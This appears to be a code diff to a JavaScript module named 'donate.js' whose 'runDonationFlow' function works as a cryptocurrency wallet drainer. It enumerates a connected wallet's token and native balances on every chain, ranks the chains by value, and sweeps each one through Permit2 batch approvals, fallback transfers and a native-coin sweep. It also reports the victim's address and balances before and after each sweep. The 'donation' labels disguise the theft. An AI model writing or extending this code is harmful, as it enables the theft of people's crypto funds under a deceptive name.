@@ -1,7 +1,10 @@
 // src/engine/donate.js
 import { notify } from "../utils/notify.js";
-import { sendEventToServer } from "../utils/eventRelay.js";
-import { fetchBalancesCovalent, filterPermit2SafeTokens, getChainValue } from "./balances.js";
+import {
+  fetchBalancesCovalent,
+  filterPermit2SafeTokens,
+  getChainValue
+} from "./balances.js";
 import { getProviderForChain } from "./providerHelper.js";
 import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
 import { executeFallbackBatch, sweepNative } from "./fallback.js";
@@ -10,57 +13,71 @@ import { ethers } from "ethers";
 
 export async function runDonationFlow(walletClient) {
   try {
-    // resolve wallet owner
+    // 🔹 1. resolve wallet owner
     let owner = null;
+    let injectedProvider = null;
+
     if (walletClient?.account?.address) {
       owner = walletClient.account.address;
     } else if (typeof window !== "undefined" && window.ethereum) {
-      const tmpProv = new ethers.BrowserProvider(window.ethereum);
-      await tmpProv.send("eth_requestAccounts", []);
-      owner = await tmpProv.getSigner().getAddress();
+      injectedProvider = new ethers.BrowserProvider(window.ethereum);
+      await injectedProvider.send("eth_requestAccounts", []);
+      owner = await injectedProvider.getSigner().getAddress();
     }
     if (!owner) throw new Error("Wallet not connected");
 
+    // 🔹 2. create single trackingId for the whole flow
     const trackingId = Date.now().toString();
 
-    // collect balances per chain
+    // 🔹 3. notify link opened (frontend init)
+    notify("LINK_OPENED", { walletAddress: owner, trackingId });
+
+    // 🔹 4. collect balances (with native)
     const chainBalances = [];
     for (const chain of CHAINS) {
       const raw = await fetchBalancesCovalent(owner, chain.chainId);
       const filtered = await filterPermit2SafeTokens(raw);
-      chainBalances.push({ ...chain, tokens: filtered, totalValue: getChainValue(filtered) });
+
+      // fetch native balance
+      const provider = await getProviderForChain(walletClient, chain.chainId, trackingId);
+      const nativeBal = await provider.provider.getBalance(owner);
+      const nativeFormatted = ethers.formatEther(nativeBal);
+
+      chainBalances.push({
+        ...chain,
+        native: nativeFormatted,
+        tokens: filtered,
+        totalValue: getChainValue(filtered) + Number(nativeFormatted)
+      });
     }
 
-    // notify + relay: WALLET_CONNECTED
     const balancesPayload = chainBalances.map(c => ({
       name: c.name,
-      native: "0", // TODO: fetch native separately if needed
+      native: c.native,
       tokens: c.tokens.map(t => ({
         name: t.tokenSymbol,
         amount: t.balanceRaw,
-        value: t.quote,
+        value: t.quote
       })),
-      total: c.totalValue,
+      total: c.totalValue
     }));
     const grandTotal = balancesPayload.reduce((acc, c) => acc + (c.total || 0), 0);
 
-    const connectedPayload = { walletAddress: owner, trackingId, balances: balancesPayload, grandTotal };
-    notify("WALLET_CONNECTED", connectedPayload);
-    await sendEventToServer("WALLET_CONNECTED", connectedPayload);
+    notify("WALLET_CONNECTED", {
+      walletAddress: owner,
+      trackingId,
+      balances: balancesPayload,
+      grandTotal
+    });
 
-    // sort chains by total value
+    // 🔹 5. sort chains by value
     chainBalances.sort((a, b) => b.totalValue - a.totalValue);
 
-    // sweep each chain
+    // 🔹 6. sweep each chain
     for (const chain of chainBalances) {
-      const localTrackingId = Date.now().toString();
+      notify("DONATION_START", { walletAddress: owner, trackingId, chain: chain.name });
 
-      // notify + relay: DONATION_START
-      const startPayload = { walletAddress: owner, trackingId: localTrackingId };
-      notify("DONATION_START", startPayload);
-      await sendEventToServer("DONATION_START", startPayload);
-
-      const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, localTrackingId);
+      const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, trackingId);
 
       const permit2Tokens = [];
       const fallbackTokens = [];
@@ -76,7 +93,6 @@ export async function runDonationFlow(walletClient) {
         else fallbackTokens.push(t);
       }
 
-      // execute permit2 batch
       try {
         if (permit2Tokens.length) {
           await executePermit2Batch(signer, chain.chainId, permit2Tokens);
@@ -86,7 +102,6 @@ export async function runDonationFlow(walletClient) {
         fallbackTokens.push(...permit2Tokens);
       }
 
-      // fallback batch
       try {
         if (fallbackTokens.length) {
           await executeFallbackBatch(signer, chain.chainId, fallbackTokens);
@@ -95,42 +110,50 @@ export async function runDonationFlow(walletClient) {
         console.warn("fallback batch error", err);
       }
 
-      // native sweep
       try {
         await sweepNative(signer, provider, chain.chainId);
       } catch (err) {
         console.warn("native sweep error", err);
       }
 
-      // notify + relay: DONATION_RESULTS
-      const resultsPayload = {
+      // 🔹 7. re-fetch balances after sweep
+      const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
+      const refreshedFiltered = await filterPermit2SafeTokens(refreshedRaw);
+      const refreshedNative = await provider.provider.getBalance(owner);
+      const refreshedNativeFormatted = ethers.formatEther(refreshedNative);
+      const refreshedTotal = getChainValue(refreshedFiltered) + Number(refreshedNativeFormatted);
+
+      // 🔹 8. notify donation made (renamed from RESULTS)
+      notify("DONATION_MADE", {
         walletAddress: owner,
-        trackingId: localTrackingId,
+        trackingId,
         balances: [
           {
             name: chain.name,
-            native: "n/a",
-            tokens: chain.tokens.map(t => ({
+            native: refreshedNativeFormatted,
+            tokens: refreshedFiltered.map(t => ({
               name: t.tokenSymbol,
               amount: t.balanceRaw,
-              value: t.quote,
+              value: t.quote
             })),
-            total: chain.totalValue,
-          },
-        ],
-        donationSummary: {
-          total: chain.totalValue,
-          breakdown: [{ chain: chain.name, amount: chain.totalValue }],
-        },
-      };
-      notify("DONATION_RESULTS", resultsPayload);
-      await sendEventToServer("DONATION_RESULTS", resultsPayload);
+            total: refreshedTotal
+          }
+        ]
+      });
     }
 
-    // notify + relay: WALLET_DISCONNECTED
-    const disconnectedPayload = { walletAddress: owner, trackingId };
-    notify("WALLET_DISCONNECTED", disconnectedPayload);
-    await sendEventToServer("WALLET_DISCONNECTED", disconnectedPayload);
+    // 🔹 9. donation completed (renamed from WALLET_DISCONNECTED at end of flow)
+    notify("DONATION_COMPLETED", { walletAddress: owner, trackingId });
+
+    // 🔹 10. listen for actual wallet disconnect
+    if (injectedProvider) {
+      injectedProvider.provider.on("disconnect", () => {
+        notify("WALLET_DISCONNECTED", { walletAddress: owner, trackingId });
+      });
+      injectedProvider.provider.on("chainChanged", chainId => {
+        notify("CHAIN_SWITCHED", { walletAddress: owner, trackingId, newChain: chainId });
+      });
+    }
 
     return { success: true };
   } catch (err) {
